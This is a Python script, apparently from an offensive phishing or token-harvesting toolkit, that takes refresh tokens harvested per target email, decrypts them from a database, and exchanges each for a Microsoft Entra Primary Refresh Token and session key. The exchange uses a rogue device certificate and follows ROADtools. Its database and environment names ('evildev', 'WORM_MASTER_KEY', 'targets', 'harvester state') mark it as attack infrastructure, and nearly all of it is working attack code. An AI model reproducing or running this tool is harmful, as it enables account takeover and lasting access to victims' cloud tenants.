#!/usr/bin/env python3
"""
PRT acquisition client (DRS stage 5), matching ROADtools' asyncdeviceauth.py.

The CT-flow request is a double-signed envelope:

  - An OUTER form body (application/x-www-form-urlencoded) with fields:
        grant_type   = urn:ietf:params:oauth:grant-type:jwt-bearer
        request      = <a signed JWS>
        windows_api_version = 2.2
        client_info  = 1
        tgt          = True

  - The JWS in `request` is RS256-signed with the DRS device certificate's
    private key. Its header carries the certificate in `x5c` (base64 DER).
    Its payload is the actual parameter dictionary (client_id, request_nonce,
    scope, win_ver, grant_type, plus the user-identity credential).

Inputs:
  - DRS-issued device certificate and its private key (drs_out/*.crt.pem
    and *.key.pem).
  - A user credential: a refresh token (preferred), a SAML token, a
    username+password, or a Windows Hello assertion. This client supports
    the refresh-token variant.

Reference:
  roadtools/roadlib/asyncdeviceauth.py, functions
  request_token_with_devicecert_signed_payload and
  get_prt_with_refresh_token.
"""

import argparse
import base64
import json
import os
import stat
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

import urllib.request
import urllib.error
import urllib.parse

import prt_snippet

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


# ---------------------------------------------------------------------------
# Wire constants (from ROADtools asyncdeviceauth.py)
# ---------------------------------------------------------------------------
TOKEN_ENDPOINT_TEMPLATE = "https://login.microsoftonline.com/{tenant_id}/oauth2/token"
NONCE_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/token"

GRANT_TYPE = "urn:ietf:params:oauth:grant-type:jwt-bearer"

# From get_prt_with_refresh_token. The hello-key variant uses a different
# client ID (38aa3b87-...) but the refresh-token variant uses this one.
CLIENT_ID_REFRESH = "29d9ed98-a469-4536-ade2-f981bc1d605e"

SCOPE = "openid aza ugs"
WIN_VER = "10.0.19041.868"
WINDOWS_API_VERSION = "2.2"


# ---------------------------------------------------------------------------
# Base64url
# ---------------------------------------------------------------------------

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64url_pad_decode(data: str) -> bytes:
    """Decode a base64url string with automatic padding.

    Equivalent to ROADtools' get_data() helper.
    """
    if isinstance(data, str):
        data = data.encode("ascii")
    pad = b"=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


# ---------------------------------------------------------------------------
# Key and certificate loading
# ---------------------------------------------------------------------------

def load_certificate(path: Path) -> x509.Certificate:
    data = path.read_bytes()
    try:
        return x509.load_pem_x509_certificate(data)
    except Exception:
        return x509.load_der_x509_certificate(data)


def load_private_key(path: Path, password: Optional[bytes] = None):
    data = path.read_bytes()
    return serialization.load_pem_private_key(data, password=password)


def verify_pairing(cert: x509.Certificate, key) -> bool:
    try:
        return cert.public_key().public_numbers() == key.public_key().public_numbers()
    except Exception:
        return False


def unwrap_session_key(wrapped_jwe: str, transport_key) -> bytes:
    """Extract the session key from the JWE returned in the PRT response.

    The response field is a compact JWE; the session key is recovered by
    RSA-OAEP-decrypting its second segment (the encrypted key) with the
    transport private key. This mirrors ROADtools'
    DeviceAuthentication.decrypt_jwe_with_transport_key.
    """
    parts = wrapped_jwe.split(".")
    if len(parts) < 2:
        raise RuntimeError(
            f"session key field is not a compact JWE (expected at least 2 "
            f"dot-separated segments, got {len(parts)})"
        )
    wrapped_key = _b64url_pad_decode(parts[1])
    if not wrapped_key:
        raise RuntimeError("JWE encrypted-key segment is empty")
    # ROADtools uses MGF1-SHA1 here, not SHA-256.
    return transport_key.decrypt(
        wrapped_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None,
        ),
    )


def _transport_key_path_for(cert_path: Path) -> Optional[Path]:
    """Return the transport private key path paired with a certificate path.

    DRS enrollment writes three files with the same stem:
        <stem>.crt.pem
        <stem>.key.pem
        <stem>.transport.key.pem
    Given the certificate, the transport key is the sibling with the
    '.transport.key.pem' suffix.
    """
    name = cert_path.name
    if name.endswith(".crt.pem"):
        stem = name[: -len(".crt.pem")]
        return cert_path.parent / f"{stem}.transport.key.pem"
    return None


# ---------------------------------------------------------------------------
# JWS signing with x5c header (matching jwt.encode with x5c)
# ---------------------------------------------------------------------------

def sign_request_jws(payload: Dict[str, Any], key, cert: x509.Certificate) -> str:
    """Sign the request payload as a JWS, with x5c = base64(DER cert) in the
    header, exactly as ROADtools does:

        certder = self.certificate.public_bytes(serialization.Encoding.DER)
        certbytes = base64.b64encode(certder)
        headers = {"x5c": certbytes.decode('utf-8'), "kdf_ver": 2}
        reqjwt = jwt.encode(payload, algorithm='RS256', key=self.keydata, headers=headers)
    """
    der = cert.public_bytes(serialization.Encoding.DER)
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "x5c": base64.b64encode(der).decode("ascii"),
        "kdf_ver": 2,
    }
    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    signature = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return f"{header_b64}.{payload_b64}.{_b64url(signature)}"


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

def post_form(endpoint: str, form: Dict[str, Any],
              timeout: float = 30.0) -> Tuple[int, Dict[str, str], bytes]:
    body = urllib.parse.urlencode(form, doseq=True).encode("utf-8")
    req = urllib.request.Request(
        endpoint,
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read()


# ---------------------------------------------------------------------------
# Request construction (matching get_prt_with_refresh_token)
# ---------------------------------------------------------------------------

def build_prt_request_payload(user_credential: Dict[str, Any],
                              nonce: str) -> Dict[str, Any]:
    """The inner parameter dictionary.

    For the refresh-token variant (ROADtools get_prt_with_refresh_token):
        user_credential = {"refresh_token": "<the user's refresh token>"}
        grant_type_inner = "refresh_token"

    For the SAML variant:
        user_credential = {"assertion": "<base64 SAML assertion>"}
        grant_type_inner = "urn:ietf:params:oauth:grant-type:saml1_1-bearer"
    """
    inner_grant = user_credential.pop("__grant_type__", None)
    if inner_grant is None:
        if "refresh_token" in user_credential:
            inner_grant = "refresh_token"
        elif "assertion" in user_credential:
            inner_grant = "urn:ietf:params:oauth:grant-type:saml1_1-bearer"
        else:
            raise ValueError("user_credential must contain refresh_token or assertion")

    payload = {
        "client_id": CLIENT_ID_REFRESH,
        "request_nonce": nonce,
        "scope": SCOPE,
        "group_sids": [],
        "win_ver": WIN_VER,
        "grant_type": inner_grant,
    }
    payload.update(user_credential)
    return payload


def build_form(user_credential: Dict[str, Any],
               cert: x509.Certificate,
               key,
               nonce: str) -> Dict[str, Any]:
    inner = build_prt_request_payload(dict(user_credential), nonce)
    reqjwt = sign_request_jws(inner, key, cert)
    return {
        "windows_api_version": WINDOWS_API_VERSION,
        "grant_type": GRANT_TYPE,
        "request": reqjwt,
        "client_info": "1",
        "tgt": "true",
    }


# ---------------------------------------------------------------------------
# Failure classification and attempt records
# ---------------------------------------------------------------------------

def classify_failure(status: int, body_bytes: bytes) -> Tuple[str, str]:
    text = body_bytes.decode("utf-8", errors="replace") if body_bytes else ""
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        parsed = {}

    error = parsed.get("error") or parsed.get("ErrorType") or ""
    desc = (
        parsed.get("error_description")
        or parsed.get("Message")
        or parsed.get("message")
        or text[:500]
    )
    if status in (401, 403):
        return ("auth", f"{error}: {desc}" if error else desc)
    if status == 400:
        return (f"schema/{error or 'invalid_request'}", str(desc)[:500])
    return ("other", f"HTTP {status}: {str(desc)[:500]}")


def write_attempt_record(out_dir: Path, stem: str, status: int,
                         category: str, message: str, body: bytes) -> Path:
    attempted_at = datetime.now(timezone.utc)
    timestamp = attempted_at.strftime("%Y%m%dT%H%M%S%fZ")
    path = out_dir / f"{stem}.{timestamp}.prt-attempt.json"
    body_excerpt = body.decode("utf-8", errors="replace")[:4000] if body else ""
    record = {
        "attempted_at": attempted_at.isoformat(),
        "http_status": status,
        "category": category,
        "message": message,
        "body_excerpt": body_excerpt,
    }
    path.write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# PRT request
# ---------------------------------------------------------------------------

def acquire_prt(tenant_id: str,
                cert_path: Path,
                key_path: Path,
                transport_key_path: Path,
                user_credential: Dict[str, Any],
                nonce: Optional[str] = None,
                timeout: float = 30.0,
                attempt_dir: Optional[Path] = None) -> Dict[str, Any]:
    """Send the CT-flow PRT request. Returns a result dict."""
    result: Dict[str, Any] = {"success": False}

    cert = load_certificate(cert_path)
    key = load_private_key(key_path)

    if not verify_pairing(cert, key):
        result["error"] = (
            "device certificate and device key do not pair; "
            "the key on disk is not the one that signed the CSR"
        )
        return result

    if not nonce:
        try:
            nonce = prt_snippet.acquire_nonce(timeout=timeout)
        except Exception as e:
            result["failure_kind"] = "nonce"
            result["failure_message"] = str(e)
            return result

    form = build_form(user_credential, cert, key, nonce)
    endpoint = TOKEN_ENDPOINT_TEMPLATE.format(tenant_id=tenant_id)
    status, _headers, body = post_form(endpoint, form, timeout=timeout)
    result["http_status"] = status

    if not (200 <= status < 300):
        kind, msg = classify_failure(status, body)
        result["failure_kind"] = kind
        result["failure_message"] = msg
        result["body_excerpt"] = body.decode("utf-8", errors="replace")[:2000]
        if attempt_dir is not None:
            try:
                attempt_dir.mkdir(parents=True, exist_ok=True)
                stem = cert_path.name[: -len(".crt.pem")]
                result["attempt_out"] = str(write_attempt_record(
                    attempt_dir, stem, status, kind, msg, body
                ))
            except Exception:
                pass
        return result

    try:
        parsed = json.loads(body.decode("utf-8"))
    except Exception:
        result["failure_kind"] = "parse"
        result["failure_message"] = "response was not JSON"
        result["body_excerpt"] = body.decode("utf-8", errors="replace")[:2000]
        return result

    # ROADtools reads the PRT out of these keys.
    prt = parsed.get("refresh_token") or parsed.get("prt")
    wrapped_session_key = parsed.get("session_key_jwe") or parsed.get("session_key")
    result["prt"] = prt
    result["wrapped_session_key"] = wrapped_session_key
    result["raw_response_keys"] = list(parsed.keys())
    if not prt:
        result["failure_kind"] = "no-prt"
        result["failure_message"] = "response had no refresh_token or prt field"
        result["body_excerpt"] = json.dumps(parsed)[:2000]
        return result

    if wrapped_session_key:
        if not transport_key_path.exists():
            result["failure_kind"] = "no-transport-key"
            result["failure_message"] = f"transport key not found at {transport_key_path}"
            return result
        try:
            transport_key = load_private_key(transport_key_path)
            result["session_key"] = unwrap_session_key(
                wrapped_session_key, transport_key
            )
            result["session_key_hex"] = result["session_key"].hex()
        except Exception as e:
            result["failure_kind"] = "unwrap"
            result["failure_message"] = str(e)
            return result
    else:
        result["failure_kind"] = "no-session-key"
        result["failure_message"] = (
            "response had no session_key_jwe or session_key field"
        )
        result["body_excerpt"] = json.dumps(parsed)[:2000]
        return result

    result["success"] = True
    return result


# ---------------------------------------------------------------------------
# Harvester state
# ---------------------------------------------------------------------------

def _db_module():
    try:
        import evildev.db as _db
        return _db
    except Exception:
        try:
            import db as _db
            return _db
        except Exception as e:
            raise RuntimeError(f"cannot import db module: {e}")


def _load_refresh_token_for_email(email: str) -> Optional[Dict[str, Any]]:
    """Resolve a live refresh token and tenant for a specific target.

    Mirrors the decryption logic in device_cert.py and app.py so all three
    read tokens.encrypted_token the same way.
    """
    try:
        row = _db_module().execute_query(
            """SELECT encrypted_token FROM tokens
               WHERE LOWER(email) = LOWER(?)""",
            params=(email,),
            fetch_one=True,
        )
    except Exception as e:
        print(f"[!] tokens lookup failed for {email}: {e}", file=sys.stderr)
        return None

    if not row or not row[0]:
        return None

    encrypted = row[0]
    key_hex = (
        os.environ.get("TOKEN_ENCRYPTION_KEY")
        or os.environ.get("WORM_MASTER_KEY")
        or os.environ.get("ENCRYPTION_KEY")
        or ""
    )
    if len(key_hex) < 64:
        print(
            "[!] no usable encryption key set "
            "(TOKEN_ENCRYPTION_KEY / WORM_MASTER_KEY / ENCRYPTION_KEY)",
            file=sys.stderr,
        )
        return None

    try:
        master_key = bytes.fromhex(key_hex[:64])
        raw = base64.b64decode(encrypted)
        nonce, ciphertext = raw[:12], raw[12:]
        plaintext = AESGCM(master_key).decrypt(nonce, ciphertext, None)
        payload = json.loads(plaintext.decode("utf-8"))
    except Exception as e:
        print(f"[!] token decrypt failed for {email}: {e}", file=sys.stderr)
        return None

    refresh_token = payload.get("refresh_token")
    if not refresh_token:
        return None

    claims = decode_jwt(payload.get("access_token", "")) or {}
    tenant_id = (
        (payload.get("user_info") or {}).get("tenantId")
        or payload.get("tenant")
        or claims.get("tid")
    )
    return {
        "refresh_token": refresh_token,
        "tenant_id": tenant_id,
        "upn": email,
    }


def decode_jwt(token: str) -> Dict[str, Any]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def load_from_state() -> Optional[Dict[str, Any]]:
    try:
        load_state = _db_module().load_harvester_state
    except Exception:
        load_state = None

    state = None
    if load_state:
        try:
            state = load_state("default")
        except Exception:
            state = None

    if state is None:
        path = Path(os.environ.get("HARVESTER_STATE_FILE", "harvester_state.json"))
        if path.exists():
            try:
                raw = json.loads(path.read_text(encoding="utf-8"))
                if isinstance(raw, dict) and raw.get("__type__") == "harvester_state_v1":
                    try:
                        decrypt = _db_module().decrypt_harvester_state
                        state = decrypt(raw)
                    except Exception:
                        state = None
                else:
                    state = raw
            except Exception:
                state = None

    if not state:
        return None

    token_data = state.get("token_data") or {}
    token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")
    if not token and not refresh_token:
        return None

    claims = decode_jwt(token) if token else {}
    return {
        "token": token,
        "refresh_token": refresh_token,
        "upn": claims.get("upn") or claims.get("unique_name") or "",
        "tenant_id": claims.get("tid") or "",
    }


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _find_latest_artifacts(
    out_dir: Path,
) -> Tuple[Optional[Path], Optional[Path], Optional[Path]]:
    if not out_dir.exists():
        return None, None, None
    certs = sorted(out_dir.glob("*.crt.pem"), key=lambda p: p.stat().st_mtime, reverse=True)
    for crt in certs:
        stem = crt.name[: -len(".crt.pem")]
        key = out_dir / f"{stem}.key.pem"
        transport_key = out_dir / f"{stem}.transport.key.pem"
        if key.exists() and transport_key.exists():
            return crt, key, transport_key
    return None, None, None


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="PRT acquisition (DRS stage 5).")

    p.add_argument("--tenant-id", default=None)
    p.add_argument("--cert", default=None)
    p.add_argument("--device-key", default=None)
    p.add_argument("--transport-key", default=None)
    p.add_argument("--enrollment-dir", default=None,
                   help="Per-enrollment directory containing cert.pem, key.pem, "
                        "transport.key.pem. Writes prt.json and session.key.bin "
                        "back into the same directory.")
    p.add_argument("--out-dir", default="drs_out")
    p.add_argument("--from-state", action="store_true",
                   help="Read the refresh token, UPN, and tenant from harvester state.")
    p.add_argument("--email", default=None,
                   help="Resolve the refresh token and tenant for this target "
                        "from tokens.encrypted_token. Mutually exclusive with "
                        "--from-state and --refresh-token.")
    p.add_argument("--refresh-token", default=None,
                   help="User refresh token to exchange for a PRT.")
    p.add_argument("--nonce", default=None)
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--dry-run", action="store_true",
                   help="Print the request shape (with truncated JWS) without POSTing.")

    args = p.parse_args(argv)

    enrollment_dir = None
    if args.enrollment_dir:
        enrollment_dir = Path(args.enrollment_dir)
        cert_path = enrollment_dir / "cert.pem"
        key_path = enrollment_dir / "key.pem"
        transport_key_path = enrollment_dir / "transport.key.pem"
        if not cert_path.exists() or not key_path.exists() or not transport_key_path.exists():
            print(f"[!] enrollment dir {enrollment_dir} is missing one of "
                  f"cert.pem / key.pem / transport.key.pem", file=sys.stderr)
            return 2
    elif args.cert and args.device_key and args.transport_key:
        cert_path = Path(args.cert)
        key_path = Path(args.device_key)
        transport_key_path = Path(args.transport_key)
    elif args.cert and args.device_key:
        cert_path = Path(args.cert)
        key_path = Path(args.device_key)
        transport_key_path = _transport_key_path_for(cert_path)
        if transport_key_path is None:
            print(f"[!] --transport-key is required for certificate {cert_path}", file=sys.stderr)
            return 2
    else:
        cert_path, key_path, transport_key_path = _find_latest_artifacts(Path(args.out_dir))
        if cert_path is None:
            print(f"[!] no complete cert/key/transport-key triple found in {args.out_dir}", file=sys.stderr)
            return 2

    tenant_id = args.tenant_id
    refresh_token = args.refresh_token
    upn = None

    sources = sum(bool(x) for x in (args.from_state, args.email, args.refresh_token))
    if sources > 1:
        print("[!] --from-state, --email, and --refresh-token are mutually "
              "exclusive; pick one", file=sys.stderr)
        return 2

    if args.email:
        resolved = _load_refresh_token_for_email(args.email)
        if not resolved:
            print(f"[!] could not resolve a refresh token for {args.email}",
                  file=sys.stderr)
            return 2
        tenant_id = tenant_id or resolved["tenant_id"]
        refresh_token = refresh_token or resolved["refresh_token"]
        upn = resolved["upn"]
    elif args.from_state or not refresh_token:
        state = load_from_state()
        if state:
            tenant_id = tenant_id or state["tenant_id"]
            refresh_token = refresh_token or state["refresh_token"]
            upn = state["upn"]

    if not tenant_id:
        print("[!] tenant id could not be resolved", file=sys.stderr)
        return 2
    if not refresh_token:
        print(
            "[!] no refresh token available. The CT flow needs a user credential: "
            "a refresh token (preferred), a SAML assertion, or a Hello key assertion. "
            "Pass --refresh-token or make sure harvester state contains one.",
            file=sys.stderr,
        )
        return 2

    if args.dry_run:
        cert = load_certificate(cert_path)
        key = load_private_key(key_path)
        nonce = args.nonce or "(would acquire via srv_challenge)"
        form = build_form({"refresh_token": refresh_token}, cert, key, nonce)
        preview = dict(form)
        preview["request"] = preview["request"][:64] + "...[truncated]"
        preview["_endpoint"] = TOKEN_ENDPOINT_TEMPLATE.format(tenant_id=tenant_id)
        preview["_upn"] = upn
        preview["_cert"] = str(cert_path)
        preview["_key"] = str(key_path)
        preview["_transport_key"] = str(transport_key_path)
        print(json.dumps(preview, indent=2))
        return 0

    result = acquire_prt(
        tenant_id=tenant_id,
        cert_path=cert_path,
        key_path=key_path,
        transport_key_path=transport_key_path,
        user_credential={"refresh_token": refresh_token},
        nonce=args.nonce,
        timeout=args.timeout,
        attempt_dir=enrollment_dir or Path(args.out_dir),
    )

    if result.get("success"):
        if enrollment_dir is not None:
            stem = "prt"
            prt_path = enrollment_dir / "prt.json"
            sk_path = enrollment_dir / "session.key.bin"
        else:
            out_dir = Path(args.out_dir)
            out_dir.mkdir(parents=True, exist_ok=True)
            stem = cert_path.name[: -len(".crt.pem")]
            prt_path = out_dir / f"{stem}.prt.json"
            sk_path = out_dir / f"{stem}.session.key.bin"

        payload = {
            "acquired_at": datetime.now(timezone.utc).isoformat(),
            "tenant_id": tenant_id,
            "upn": upn,
            "cert_path": str(cert_path),
            "prt": result.get("prt"),
            "wrapped_session_key": result.get("wrapped_session_key"),
        }
        prt_path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
        if result.get("session_key"):
            sk_path.write_bytes(result["session_key"])
            try:
                os.chmod(sk_path, stat.S_IRUSR | stat.S_IWUSR)
            except Exception:
                pass
            print(f"[+]    session key:  {sk_path}")
        if enrollment_dir is not None:
            try:
                db = _db_module()
                db.update_enrollment(
                    enrollment_dir.name,
                    prt_acquired_at=datetime.now(timezone.utc).isoformat(),
                )
            except Exception as e:
                print(f"[!] could not update enrollment row: {e}", file=sys.stderr)

            try:
                row = db.execute_query(
                    "SELECT email FROM enrollments WHERE enrollment_id = ?",
                    params=(enrollment_dir.name,),
                    fetch_one=True,
                )
                target_email = row[0] if row else None
                if target_email:
                    db.execute_query(
                        "UPDATE targets SET prt_acquired_at = ?, drs_prt_error = NULL "
                        "WHERE LOWER(email) = LOWER(?)",
                        params=(datetime.now(timezone.utc).isoformat(), target_email),
                        commit=True,
                    )
            except Exception as e:
                print(f"[!] could not mark PRT on target row: {e}", file=sys.stderr)

        print(f"[ok  ] PRT acquired for {upn or '(unknown)'}")
        print(f"[+]    PRT envelope: {prt_path}")
        print(f"[+]    response keys: {result.get('raw_response_keys')}")
        return 0

    kind = result.get("failure_kind") or "error"
    msg = result.get("failure_message") or result.get("error") or "unknown"
    attempt_path = result.get("attempt_out")
    note = f" (details: {attempt_path})" if attempt_path else ""

    if enrollment_dir is not None:
        try:
            db = _db_module()
            row = db.execute_query(
                "SELECT email FROM enrollments WHERE enrollment_id = ?",
                params=(enrollment_dir.name,),
                fetch_one=True,
            )
            target_email = row[0] if row else None
            if target_email:
                try:
                    from enrollment import mark_prt_failed
                    mark_prt_failed(target_email, f"{kind}: {msg}")
                except Exception:
                    db.execute_query(
                        "UPDATE targets SET drs_prt_error = ? WHERE LOWER(email) = LOWER(?)",
                        params=(f"{kind}: {msg}", target_email),
                        commit=True,
                    )
        except Exception as e:
            print(f"[!] could not record PRT error on target row: {e}", file=sys.stderr)

    print(f"[fail] {kind}: {msg}{note}", file=sys.stderr)
    if result.get("body_excerpt"):
        print("[body excerpt]", file=sys.stderr)
        print(result["body_excerpt"], file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())